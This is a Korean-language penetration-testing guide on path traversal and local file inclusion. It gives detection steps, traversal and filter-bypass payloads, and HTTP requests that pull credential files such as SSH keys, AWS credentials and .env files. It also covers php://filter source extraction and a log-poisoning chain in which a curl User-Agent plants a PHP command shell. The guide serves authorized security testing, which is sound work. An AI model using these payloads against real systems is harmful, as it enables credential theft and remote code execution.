---
sidebar_position: 15
title: Path Traversal / LFI
description: 웹 진단 - Path Traversal & LFI 점검 절차, 스택별 페이로드, PHP LFI to RCE, 판정 기준
keywords: [LFI, Local File Inclusion, Path Traversal, php filter, Log Poisoning, 경로 조작, OWASP A01]
draft: false
---

# 경로 조작 / 로컬 파일 인클루전
> 사용자 입력으로 파일 경로가 결정되는 곳에서 `../` 등으로 **임의 파일을 읽거나 인클루드**하는 취약점.
> 단순 파일 읽기는 모든 언어/스택에서 발생하며, **PHP의 `include`/`require`** 일 때만 코드 실행(RCE) 까지 체인 가능.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A01:2025 - Broken Access Control / KISA 입력값 검증 |
| **CWE** | [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html), [CWE-98: PHP File Inclusion](https://cwe.mitre.org/data/definitions/98.html) |
| **영향도** | 🔴 높음 (자격증명/소스코드 노출) ~ 🔴 매우 높음 (PHP LFI → RCE 체인 시) |
| **점검 난이도** | 하 (기본 traversal) / 상 (필터 우회, RCE 체인) |
| **예상 점검 시간** | 30분 ~ 3시간 |

---

## 점검 목적

파일 경로/이름을 사용자 입력으로 받는 기능에서 **경로 정규화·화이트리스트 없이 파일 시스템에 접근**하는지 확인한다. 성공 시 **시스템 파일·소스코드·자격증명 파일 노출**이 가능하며, PHP의 `include`/`require` 가 사용자 입력을 받으면 **임의 PHP 코드 실행(RCE)** 까지 체인할 수 있다.

---

## 두 가지 양상 — 먼저 구분하기

| 구분 | 어디서 발생 | 영향 |
| :--- | :--- | :--- |
| **Path Traversal (단순 파일 읽기)** | 모든 언어/스택 (Java, Python, Node.js, .NET, Go, PHP) | 임의 파일 내용 노출 |
| **PHP LFI → RCE 체인** | **거의 PHP 한정** (`include`, `require` 가 사용자 입력 받을 때) | 임의 코드 실행 (RCE) |
| **Node.js 동적 `require()`** | Node.js 한정, 가끔 발견 | 로컬 .js 파일 실행 → RCE |

> **왜 PHP만 RCE 체인이 되는가**: PHP의 `include('파일')` 은 파일 내용을 PHP로 평가(실행) 한다. 다른 언어의 파일 읽기 함수(`File.readAllBytes()`, `open().read()`, `fs.readFile()`) 는 그냥 문자열을 반환할 뿐이라 코드로 실행되지 않는다. 그래서 `php://filter`, Log Poisoning, `data://` 같은 체인은 PHP 환경일 때만 시도.

---

## 진단 절차

### Step 1. 진입점 식별

파일 경로/이름이 파라미터에 보이는 모든 곳을 후보로:

- `?file=`, `?page=`, `?include=`, `?path=`, `?template=`, `?lang=ko.php`, `?doc=`, `?download=`, `?image=`
- 파일 다운로드 / 첨부파일 미리보기 / 이미지 리사이즈 / 다국어 처리 / 템플릿 선택
- 업로드 파일 retrieval (`/uploads/<filename>` 같은 라우트)

**스택별 의심 함수 (코드 검토 시점):**

| 스택 | 위험 함수 |
| :--- | :--- |
| **Java** | `new File(userInput)`, `Files.readAllBytes(Paths.get(userInput))`, `getResourceAsStream(userInput)` |
| **Python** | `open(userInput)`, Flask `send_file(userInput)`, Django `serve()` 잘못 사용 |
| **Node.js** | `fs.readFile(userInput)`, `res.sendFile(userInput)`, `path.join(__dirname, userInput)` |
| **.NET** | `File.ReadAllText(userInput)`, `Server.MapPath(userInput)`, `Response.WriteFile(userInput)` |
| **PHP** | `file_get_contents()`, `readfile()`, `fopen()` (읽기) / **`include`, `require`** (실행) |

### Step 2. 1차 탐지 — 기본 traversal

`../` 깊이 점진 증가로 시스템 파일 도달 시도:

```
?file=/etc/passwd
?file=../etc/passwd
?file=../../etc/passwd
?file=../../../../../../etc/passwd
```

응답에 `root:x:0:0:...` 가 보이면 → Path Traversal 확정.

### Step 3. 필터 우회

`../` 가 차단되면 우회 패턴 시도 (케이스 4 참조).

### Step 4a. 영향 입증 — 자격증명 파일 추출
`/etc/passwd` 입증만으로는 부족. 스택에 따라 자격증명/설정 파일을 노린다 (케이스 5 참조).

### Step 4b. PHP 환경 한정 — RCE 체인 시도

대상이 PHP면 (응답 헤더 `X-Powered-By: PHP`, `.php` 확장자, PHP 세션 쿠키 `PHPSESSID`), 다음 시도:
- `php://filter` 로 소스코드 base64 추출 (케이스 6)
- Log Poisoning 으로 RCE (케이스 7)

---

## 페이로드 / 테스트 케이스

### 케이스 1: 기본 Path Traversal

**언제 쓰는지**: 1차 탐지. 모든 스택 공통.

```
?file=../../../../../../etc/passwd
?file=../../../../../../etc/hostname
?file=..\..\..\..\Windows\win.ini       (Windows 대상)
```

**판정**: 응답에 파일 내용이 그대로 노출되면 취약. `/etc/passwd` 가 안 되면 `/etc/hostname` 같은 더 간단한 파일로도 시도 (권한 차이로 hostname만 읽히는 경우 있음).

#### 다운로드 API에서 자주 보이는 `saveName` 패턴

파일 다운로드 API가 `uploads/` 같은 기준 경로에 사용자 입력 파일명을 단순 결합하면, 화면에 보이는 원본 파일명(`originName`)이 아니라 실제 저장명(`saveName`, `path`, `key`) 쪽을 우선 변조한다.

```http
GET /api/file/download?saveName=../../../etc/passwd&originName=passwd.txt HTTP/1.1
Host: <TARGET>

GET /api/file/download?saveName=../../opt/tomcat/conf/tomcat-users.xml&originName=config.xml HTTP/1.1
Host: <TARGET>

GET /api/file/download?saveName=../application.properties&originName=config.txt HTTP/1.1
Host: <TARGET>
```

필터가 있으면 인코딩을 바꿔 재시도한다.

```http
GET /api/file/download?saveName=..%2F..%2F..%2Fetc%2Fpasswd&originName=passwd.txt HTTP/1.1
GET /api/file/download?saveName=..%252F..%252F..%252Fetc%252Fpasswd&originName=passwd.txt HTTP/1.1
```

**판정:** 다운로드된 파일 내용이 시스템 파일/설정 파일이면 취약. `originName`은 보통 `Content-Disposition`의 표시명에만 쓰이므로, 경로 영향이 있는 파라미터를 구분해서 본다.

### 케이스 2: 절대 경로

**언제 쓰는지**: 단순 traversal이 차단(`../` 필터링) 되어도, 절대 경로는 그대로 통과하는 경우 자주 있음.

```
?file=/etc/passwd
?file=/proc/self/environ
?file=C:\Windows\win.ini
```

**판정**: 응답 노출 시 취약. 코드가 단순 `str_replace('../', '', $file)` 같은 필터만 적용한 정황 강함.

### 케이스 3: 확장자 강제 추가 우회

**언제 쓰는지**: 코드가 `include($file . ".php")` 또는 `open(input + ".log")` 처럼 확장자를 강제로 붙여서, 원하는 파일이 그대로 안 열릴 때.

```
# Null Byte
?file=../../../../etc/passwd%00

# Query string으로 확장자 무시 유도
?file=../../../../etc/passwd?
?file=../../../../etc/passwd%23   (# URL 인코딩)

# 디렉토리 트래버설로 .php 무력화
?file=../../../../etc/passwd/.    (일부 환경에서 동작)
```

**판정**: 위 페이로드 중 하나로 케이스 1과 같은 응답이 나오면 취약. Null Byte는 2010년 이후 PHP 환경에서는 거의 안 통하므로 우선순위 낮음.

### 케이스 4: 필터 우회
**언제 쓰는지**: `../` 단순 문자열 차단 / 정규화 미흡 시.

```
# 점-슬래시 변형
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd

# URL 인코딩
%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/etc/passwd

# 이중 URL 인코딩
%252e%252e%252fetc/passwd
```

**판정**: 케이스 1이 차단된 환경에서 위 페이로드로 통과되면 → 필터가 단순 문자열 매칭만 하고 정규화 미적용 = 취약.

> 유니코드 우회(`%c0%ae`, `%uff0e`) 는 모던 웹서버에서 거의 안 통하므로 시도 가치 낮음.

### 케이스 5: 자격증명 / 설정 파일 추출
**언제 쓰는지**: Path Traversal 확정 후 영향 입증. 스택에 따라 노릴 파일이 다르다.

| 스택 | 우선 시도 파일 | 노출 시 영향 |
| :--- | :--- | :--- |
| **공통 (Linux)** | `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, `~/.ssh/id_rsa`, `~/.bash_history` | 사용자 목록, 환경변수, SSH 키 |
| **공통 (AWS)** | `~/.aws/credentials`, `/var/lib/cloud/instance/user-data.txt` | AWS 키, 인스턴스 user-data 스크립트 (자격증명 하드코딩 자주 있음) |
| **Java (Spring)** | `application.properties`, `application.yml`, `application-prod.yml`, `bootstrap.yml` | DB 접속 정보, JWT secret, API 키 |
| **Node.js** | `.env`, `package.json`, `config/default.json`, `ecosystem.config.js` | DB 접속 정보, API 키, JWT secret |
| **Python (Django/Flask)** | `settings.py`, `local_settings.py`, `.env`, `instance/config.py` | SECRET_KEY, DB 접속 정보 |
| **.NET** | `web.config`, `appsettings.json`, `appsettings.Production.json` | 연결 문자열, 머신 키 |
| **PHP** | `wp-config.php`, `config.php`, `.env`, `database.php` (Laravel) | DB 접속 정보 |
| **Web 서버 로그** | `/var/log/nginx/access.log`, `/var/log/apache2/access.log` | 사용자 활동, 세션 토큰, 자격증명 |

**판정**: 자격증명·secret 이 응답에 노출되면 입증 완료. 소스코드 파일은 응답에 깨져 보일 수 있으니 (PHP/JSP 같이 서버측 처리되는 파일) PHP라면 케이스 6의 `php://filter` 사용.

### 케이스 6: PHP 한정 — `php://filter` 로 소스코드 base64 추출

**언제 쓰는지**: 대상이 PHP 환경이고, `.php` 파일 내용을 그대로 읽으려 하면 서버에서 실행되어 소스가 안 보일 때.

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
?file=php://filter/convert.base64-encode/resource=../config/database.php
```

**판정**: 응답 본문에 base64 문자열이 출력되면 디코드해서 PHP 소스코드 확인. DB 자격증명, API 키, 내부 로직 노출 시 Critical.

```bash
echo "PD9waHAgLi4u" | base64 -d
```

### 케이스 7: PHP 한정 — Log Poisoning → RCE

**언제 쓰는지**: PHP LFI(`include`/`require` 가 사용자 입력을 받음) 가 확정되었고, 웹 서버 로그 파일(access.log) 까지 읽을 수 있을 때. 단순 파일 읽기(`file_get_contents`) 만 가능한 경우엔 동작하지 않음.

**1) User-Agent 헤더에 PHP 코드 삽입 (서버 access.log에 기록됨):**

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET>/"
```

**2) LFI로 access.log 인클루드 + cmd 실행:**

```
?file=/var/log/apache2/access.log&cmd=id
?file=/var/log/nginx/access.log&cmd=whoami
```

**판정**: 응답에 명령 결과(`uid=33(www-data)...`) 가 포함되면 RCE 입증. 로그 파일 권한이 막혀 있으면 동작하지 않으므로 (모던 환경에서는 자주 차단됨) 안 통해도 LFI 자체 결함은 유효.

> `/proc/self/environ` 인클루드, PHP 세션 파일 인클루드 등 비슷한 RCE 기법이 있지만, 모두 환경 의존적. Log Poisoning이 대표 케이스.

### 케이스 8: Node.js 한정 — 동적 `require()` LFI → RCE

**언제 쓰는지**: 코드 검토에서 `require(userInput)` 패턴이 발견되었거나, 동적 모듈 로딩이 의심될 때. 실무에서 가끔 발견.

```
?module=../../../../etc/passwd     (단순 파일 읽기는 require가 거부 — .js만 허용)
?module=./../../uploads/abc.js     (업로드한 .js 파일 경로)
```

**시나리오**: 파일 업로드(이미지/문서) 가 가능하고, 업로드된 파일이 서버에 저장되며, 그 경로가 동적 `require()` 로 도달 가능하면 RCE.

**판정**: 업로드한 임의 .js 파일의 코드가 실행되면 (예: 외부 콜백 발생, 응답에 결과 출력) 입증. 케이스 7의 PHP Log Poisoning에 대응되는 Node.js 패턴.

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] `../` 또는 절대 경로로 **시스템 파일**(`/etc/passwd`, `/etc/hostname` 등) 응답에 노출
- [ ] 스택별 **자격증명/설정 파일**(`.env`, `application.properties`, `wp-config.php` 등) 노출
- [ ] PHP 환경에서 `php://filter` 로 **소스코드 base64 추출** 가능
- [ ] PHP LFI + Log Poisoning으로 **임의 명령 실행**
- [ ] Node.js 동적 `require()` 로 임의 .js 파일 실행

**오탐 주의 (다음은 결함 아님 또는 별도 결함):**

- [ ] 정상적인 다운로드 기능에서 **사전 매핑된 파일 ID**로만 접근 가능 (예: `?id=42` → 내부 매핑 → 안전)
- [ ] 단순 404 응답 (파일 미존재 / 권한 차단)
- [ ] CDN/정적 리소스 서버에서 절대 경로 차단 (Path Traversal 차단됨)

---

## 참고자료

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP File Inclusion](https://owasp.org/www-community/attacks/File_Inclusion)
- [PortSwigger - Directory traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger - File path traversal vulnerabilities (lab 모음)](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [HackTricks - LFI / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
